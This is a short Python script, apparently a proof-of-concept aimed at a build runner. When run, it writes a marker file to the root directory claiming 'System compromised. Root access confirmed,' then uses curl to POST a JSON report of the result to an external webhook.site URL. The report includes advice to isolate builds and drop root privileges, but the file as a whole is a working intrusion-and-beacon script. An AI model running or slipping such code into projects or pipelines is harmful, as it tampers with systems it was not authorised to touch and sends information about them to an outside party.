import subprocess
import json

WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def final_strike():
    # Создаем файл, который не должен существовать в защищенной среде
    try:
        with open("/LUMOS_WAS_HERE", "w") as f:
            f.write("System compromised. Root access confirmed.")
        persistence_check = "SUCCESS: Created file in root (/) directory."
    except Exception as e:
        persistence_check = f"FAILED: {str(e)}"

    report = {
        "alert": "PERSISTENCE_DEMO",
        "message": "I can modify the root filesystem of your build runner.",
        "check": persistence_check,
        "advice": "Isolate build processes and drop root privileges immediately."
    }

    subprocess.run([
        'curl', '-s', '-X', 'POST', 
        '-H', 'Content-Type: application/json',
        '-d', json.dumps(report), 
        WEBHOOK_URL
    ])

if __name__ == "__main__":
    final_strike()
